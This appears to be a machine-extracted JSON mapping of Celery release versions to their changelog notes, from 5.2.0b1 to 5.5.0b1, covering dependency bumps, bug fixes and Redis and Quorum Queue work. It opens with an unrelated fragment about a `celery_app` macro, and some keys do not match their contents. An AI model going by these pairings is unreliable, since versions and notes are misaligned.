Removed\n\n- The `Error` type.\n- The `celery_app` macro has been renamed to just `app`.\n- The `ResultExt` re-export.\n\n\n.. _changelog:\n\n================\n Change history\n================\n\nThis document contains change notes for bugfix & new features\nin the main branch & 5.5.x series, please see :ref:`whatsnew-5.5` for\nan overview of what's new in Celery 5.5.\n\n.. _version-5.5.0b1:\n\n", "5.5.0b1": "=======\n\n:release-date: 2024-07-24\n:release-by: Tomer Nosrati\n\nCelery v5.5.0 Beta 1 is now available for testing.\nPlease help us test this version and report any issues.\n\nKey Highlights\n~~~~~~~~~~~~~~\n\nRedis Broker Stability Improvements\n-----------------------------------\nThe root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_\nin the release-candidate for Kombu v5.4.0. This beta release has been upgraded to use the new\nKombu RC version, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues:\n`7276 <https://github.com/celery/celery/discussions/7276>`_,\n`8091 <https://github.com/celery/celery/discussions/8091>`_,\n`8030 <https://github.com/celery/celery/discussions/8030>`_,\n`8384 <https://github.com/celery/celery/discussions/8384>`_\n\nQuorum Queues Initial Support\n-----------------------------\nThis release introduces the initial support for Quorum Queues with Celery. \n\nSee new configuration options for more details:\n\n- :setting:`task_default_queue_type`\n- :setting:`worker_detect_quorum_queues`\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues:\n`6067 <https://github.com/celery/celery/discussions/6067>`_,\n`9121 <https://github.com/celery/celery/discussions/9121>`_\n\nWhat's Changed\n~~~~~~~~~~~~~~\n\n- (docs): use correct version celery v.5.4.x (8975)\n- Update mypy to 1.10.0 (8977)\n- Limit pymongo<4.7 when Python <= 3.10 due to breaking changes in 4.7 (8988)\n- Bump pytest from 8.1.1 to 8.2.0 (8987)\n- Update README to Include FastAPI in Framework Integration Section (8978)\n- Clarify return values of ..._on_commit methods (8984)\n- add kafka broker docs (8935)\n- Limit pymongo<4.7 regardless of Python version (8999)\n- Update pymongo[srv] requirement from <4.7,>=4.0.2 to >=4.0.2,<4.8 (9000)\n- Update elasticsearch requirement from <=8.13.0 to <=8.13.1 (9004)\n- security: SecureSerializer: support generic low-level serializers (8982)\n- don't kill if pid same as file (8997) (8998)\n- Update cryptography to 42.0.6 (9005)\n- Bump cryptography from 42.0.6 to 42.0.7 (9009)\n- Added -vv to unit, integration and smoke tests (9014)\n- SecuritySerializer: ensure pack separator will not be conflicted with serialized fields (9010)\n- Update sphinx-click to 5.2.2 (9025)\n- Bump sphinx-click from 5.2.2 to 6.0.0 (9029)\n- Fix a typo to display the help message in first-steps-with-django (9036)\n- Pinned requests to v2.31.0 due to docker-py bug 3256 (9039)\n- Fix certificate validity check (9037)\n- Revert \"Pinned requests to v2.31.0 due to docker-py bug 3256\" (9043)\n- Bump pytest from 8.2.0 to 8.2.1 (9035)\n- Update elasticsearch requirement from <=8.13.1 to <=8.13.2 (9045)\n- Fix detection of custom task set as class attribute with Django (9038)\n- Update elastic-transport requirement from <=8.13.0 to <=8.13.1 (9050)\n- Bump pycouchdb from 1.14.2 to 1.16.0 (9052)\n- Update pytest to 8.2.2 (9060)\n- Bump cryptography from 42.0.7 to 42.0.8 (9061)\n- Update elasticsearch requirement from <=8.13.2 to <=8.14.0 (9069)\n- [enhance feature] Crontab schedule: allow using month names (9068)\n- Enhance tox environment: [testenv:clean] (9072)\n- Clarify docs about Reserve one task at a time (9073)\n- GCS docs fixes (9075)\n- Use hub.remove_writer instead of hub.remove for write fds (4185) (9055)\n- Class method to process crontab string (9079)\n- Fixed smoke tests env bug when using integration tasks that rely on Redis (9090)\n- Bugfix - a task will run multiple times when chaining chains with groups (9021)\n- Bump mypy from 1.10.0 to 1.10.1 (9096)\n- Don't add a separator to global_keyprefix if it already has one (9080)\n- Update pymongo[srv] requirement from <4.8,>=4.0.2 to >=4.0.2,<4.9 (9111)\n- Added missing import in examples for Django (9099)\n- Bump Kombu to v5.4.0rc1 (9117)\n- Removed skipping Redis in t/smoke/tests/test_consumer.py tests (9118)\n- Update pytest-subtests to 0.13.0 (9120)\n- Increased smoke tests CI timeout (9122)\n- Bump Kombu to v5.4.0rc2 (9127)\n- Update zstandard to 0.23.0 (9129)\n- Update pytest-subtests to 0.13.1 (9130)\n- Changed retry to tenacity in smoke tests (9133)\n- Bump mypy from 1.10.1 to 1.11.0 (9135)\n- Update cryptography to 43.0.0 (9138)\n- Update pytest to 8.3.1 (9137)\n- Added support for Quorum Queues (9121)\n- Bump Kombu to v5.4.0rc3 (9139)\n- Cleanup in Changelog.rst (9141)\n- Update Django docs for CELERY_CACHE_BACKEND (9143)\n- Added missing docs to previous releases (9144)\n- Fixed a few documentation build warnings (9145)\n- docs(README): link invalid (9148)\n- Prepare for (pre) release: v5.5.0b1 (9146)\n\n.. _version-5.4.0:\n\n", "5.4.0": "=====\n\n:release-date: 2024-04-17\n:release-by: Tomer Nosrati\n\nCelery v5.4.0 and v5.3.x have consistently focused on enhancing the overall QA, both internally and externally.\nThis effort led to the new pytest-celery v1.0.0 release, developed concurrently with v5.3.0 & v5.4.0.\n\nThis release introduces two significant QA enhancements:\n\n- **Smoke Tests**: A new layer of automatic tests has been added to Celery's standard CI. These tests are designed to handle production scenarios and complex conditions efficiently. While new contributions will not be halted due to the lack of smoke tests, we will request smoke tests for advanced changes where appropriate.\n- `Standalone Bug Report Script <https://docs.celeryq.dev/projects/pytest-celery/en/latest/userguide/celery-bug-report.html>`_: The new pytest-celery plugin now allows for encapsulating a complete Celery dockerized setup within a single pytest script. Incorporating these into new bug reports will enable us to reproduce reported bugs deterministically, potentially speeding up the resolution process.\n\nContrary to the positive developments above, there have been numerous reports about issues with the Redis broker malfunctioning\nupon restarts and disconnections. Our initial attempts to resolve this were not successful (8796).\nWith our enhanced QA capabilities, we are now prepared to address the core issue with Redis (as a broker) again.\n\nThe rest of the changes for this release are grouped below, with the changes from the latest release candidate listed at the end.\n\nChanges\n~~~~~~~\n- Add a Task class specialised for Django (8491)\n- Add Google Cloud Storage (GCS) backend (8868)\n- Added documentation to the smoke tests infra (8970)\n- Added a checklist item for using pytest-celery in a bug report (8971)\n- Bugfix: Missing id on chain (8798)\n- Bugfix: Worker not consuming tasks after Redis broker restart (8796)\n- Catch UnicodeDecodeError when opening corrupt beat-schedule.db (8806)\n- chore(ci): Enhance CI with `workflow_dispatch` for targeted debugging and testing (8826)\n- Doc: Enhance \"Testing with Celery\" section (8955)\n- Docfix: pip install celery[sqs] -> pip install \"celery[sqs]\" (8829)\n- Enable efficient `chord` when using dynamicdb as backend store (8783)\n- feat(daemon): allows daemonization options to be fetched from app settings (8553)\n- Fix DeprecationWarning: datetime.datetime.utcnow() (8726)\n- Fix recursive result parents on group in middle of chain (8903)\n- Fix typos and grammar (8915)\n- Fixed version documentation tag from 8553 in configuration.rst (8802)\n- Hotfix: Smoke tests didn't allow customizing the worker's command arguments, now it does (8937)\n- Make custom remote control commands available in CLI (8489)\n- Print safe_say() to stdout for non-error flows (8919)\n- Support moto 5.0 (8838)\n- Update contributing guide to use ssh upstream url (8881)\n- Update optimizing.rst (8945)\n- Updated concurrency docs page. (8753)\n\nDependencies Updates\n~~~~~~~~~~~~~~~~~~~~\n- Bump actions/setup-python from 4 to 5 (8701)\n- Bump codecov/codecov-action from 3 to 4 (8831)\n- Bump isort from 5.12.0 to 5.13.2 (8772)\n- Bump msgpack from 1.0.7 to 1.0.8 (8885)\n- Bump mypy from 1.8.0 to 1.9.0 (8898)\n- Bump pre-commit to 3.6.1 (8839)\n- Bump pre-commit/action from 3.0.0 to 3.0.1 (8835)\n- Bump pytest from 8.0.2 to 8.1.1 (8901)\n- Bump pytest-celery to v1.0.0 (8962)\n- Bump pytest-cov to 5.0.0 (8924)\n- Bump pytest-order from 1.2.0 to 1.2.1 (8941)\n- Bump pytest-subtests from 0.11.0 to 0.12.1 (8896)\n- Bump pytest-timeout from 2.2.0 to 2.3.1 (8894)\n- Bump python-memcached from 1.59 to 1.61 (8776)\n- Bump sphinx-click from 4.4.0 to 5.1.0 (8774)\n- Update cryptography to 42.0.5 (8869)\n- Update elastic-transport requirement from <=8.12.0 to <=8.13.0 (8933)\n- Update elasticsearch requirement from <=8.12.1 to <=8.13.0 (8934)\n- Upgraded Sphinx from v5.3.0 to v7.x.x (8803)\n\n", "5.4": "environments. The release candidate version is available for testing.\nThe official release is planned for March-April 2024.\n\n- New Config: worker_enable_prefetch_count_reduction (8581)\n- Added \"Serverless\" section to Redis doc (redis.rst) (8640)\n- Upstash's Celery example repo link fix (8665)\n- Update mypy version (8679)\n- Update cryptography dependency to 41.0.7 (8690)\n- Add type annotations to celery/utils/nodenames.py (8667)\n- Issue 3426. Adding myself to the contributors. (8696)\n- Bump actions/setup-python from 4 to 5 (8701)\n- Fixed bug where chord.link_error() throws an exception on a dict type errback object (8702)\n- Bump github/codeql-action from 2 to 3 (8725)\n- Fixed multiprocessing integration tests not running on Mac (8727)\n- Added make docker-docs (8729)\n- Fix DeprecationWarning: datetime.datetime.utcnow() (8726)\n- Remove `new` adjective in docs (8743)\n- add type annotation to celery/utils/sysinfo.py (8747)\n- add type annotation to celery/utils/iso8601.py (8750)\n- Change type annotation to celery/utils/iso8601.py (8752)\n- Update test deps (8754)\n- Mark flaky: test_asyncresult_get_cancels_subscription() (8757)\n- change _read_as_base64 (b64encode returns bytes) on celery/utils/term.py (8759)\n- Replace string concatenation with fstring on celery/utils/term.py (8760)\n- Add type annotation to celery/utils/term.py (8755)\n- Skipping test_tasks::test_task_accepted (8761)\n- Updated concurrency docs page. (8753)\n- Changed pyup -> dependabot for updating dependencies (8764)\n- Bump isort from 5.12.0 to 5.13.2 (8772)\n- Update elasticsearch requirement from <=8.11.0 to <=8.11.1 (8775)\n- Bump sphinx-click from 4.4.0 to 5.1.0 (8774)\n- Bump python-memcached from 1.59 to 1.61 (8776)\n- Update elastic-transport requirement from <=8.10.0 to <=8.11.0 (8780)\n- python-memcached==1.61 -> python-memcached>=1.61 (8787)\n- Remove usage of utcnow (8791)\n- Smoke Tests (8793)\n- Moved smoke tests to their own workflow (8797)\n- Bugfix: Worker not consuming tasks after Redis broker restart (8796)\n- Bugfix: Missing id on chain (8798)\n\n.. _version-5.3.6:\n\n", "5.2.7": "=====\n\n:release-date: 2022-5-26 12:15 P.M UTC+2:00\n:release-by: Omer Katz\n\n- Fix packaging issue which causes poetry 1.2b1 and above to fail install Celery (7534).\n\n.. _version-5.2.6:\n\n", "5.2.6": "=====\n\n:release-date: 2022-4-04 21:15 P.M UTC+2:00\n:release-by: Omer Katz\n\n- load_extension_class_names - correct module_name (7433).\n    This fixes a regression caused by 7218.\n\n.. _version-5.2.5:\n\n", "5.2.5": "=====\n\n:release-date: 2022-4-03 20:42 P.M UTC+2:00\n:release-by: Omer Katz\n\n**This release was yanked due to a regression caused by the PR below**\n\n- Use importlib instead of deprecated pkg_resources (7218).\n\n.. _version-5.2.4:\n\n", "5.2.0rc2": "========\n\n:release-date: 2021-11-02 1.54 P.M UTC+3:00\n:release-by: Naomi Elstein\n\n- Bump Python 3.10.0 to rc2.\n- [pre-commit.ci] pre-commit autoupdate (6972).\n- autopep8.\n- Prevent worker to send expired revoked items upon hello command (6975).\n- docs: clarify the 'keeping results' section (6979).\n- Update deprecated task module removal in 5.0 documentation (6981).\n- [pre-commit.ci] pre-commit autoupdate.\n- try python 3.10 GA.\n- mention python 3.10 on readme.\n- Documenting the default consumer_timeout value for rabbitmq >= 3.8.15.\n- Azure blockblob backend parametrized connection/read timeouts (6978).\n- Add as_uri method to azure block blob backend.\n- Add possibility to override backend implementation with celeryconfig (6879).\n- [pre-commit.ci] pre-commit autoupdate.\n- try to fix deprecation warning.\n- [pre-commit.ci] pre-commit autoupdate.\n- not needed anyore.\n- not needed anyore.\n- not used anymore.\n- add github discussions forum\n\n.. _version-5.2.0rc1:\n\n", "5.2.0b3": "=======\n\n:release-date: 2021-09-02 8.38 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Add args to LOG_RECEIVED (fixes 6885) (6898).\n- Terminate job implementation for eventlet concurrency backend (6917).\n- Add cleanup implementation to filesystem backend (6919).\n- [pre-commit.ci] pre-commit autoupdate (69).\n- Add before_start hook (fixes 4110) (6923).\n- Restart consumer if connection drops (6930).\n- Remove outdated optimization documentation (6933).\n- added https verification check functionality in arangodb backend (6800).\n- Drop Python 3.6 support.\n- update supported python versions on readme.\n- [pre-commit.ci] pre-commit autoupdate (6935).\n- Remove appveyor configuration since we migrated to GA.\n- pyugrade is now set to upgrade code to 3.7.\n- Drop exclude statement since we no longer test with pypy-3.6.\n- 3.10 is not GA so it's not supported yet.\n- Celery 5.1 or earlier support Python 3.6.\n- Fix linting error.\n- fix: Pass a Context when chaining fail results (6899).\n- Bump version: 5.2.0b2 \u2192 5.2.0b3.\n\n.. _version-5.2.0b2:\n\n", "5.2.0b2": "=======\n\n:release-date: 2021-08-17 5.35 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Test windows on py3.10rc1 and pypy3.7 (6868).\n- Route chord_unlock task to the same queue as chord body (6896).\n- Add message properties to app.tasks.Context (6818).\n- handle already converted LogLevel and JSON (6915).\n- 5.2 is codenamed dawn-chorus.\n- Bump version: 5.2.0b1 \u2192 5.2.0b2.\n\n.. _version-5.2.0b1:\n\n", "5.2.0b1": "=======\n\n:release-date: 2021-08-11 5.42 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Add Python 3.10 support (6807).\n- Fix docstring for Signal.send to match code (6835).\n- No blank line in log output (6838).\n- Chords get body_type independently to handle cases where body.type does not exist (6847).\n- Fix 6844 by allowing safe queries via app.inspect().active() (6849).\n- Fix multithreaded backend usage (6851).\n- Fix Open Collective donate button (6848).\n- Fix setting worker concurrency option after signal (6853).\n- Make ResultSet.on_ready promise hold a weakref to self (6784).\n- Update configuration.rst.\n- Discard jobs on flush if synack isn't enabled (6863).\n- Bump click version to 8.0 (6861).\n- Amend IRC network link to Libera (6837).\n- Import celery lazily in pytest plugin and unignore flake8 F821, \"undefined name '...'\" (6872).\n- Fix inspect --json output to return valid json without --quiet.\n- Remove celery.task references in modules, docs (6869).\n-  The Consul backend must correctly associate requests and responses (6823).\n"}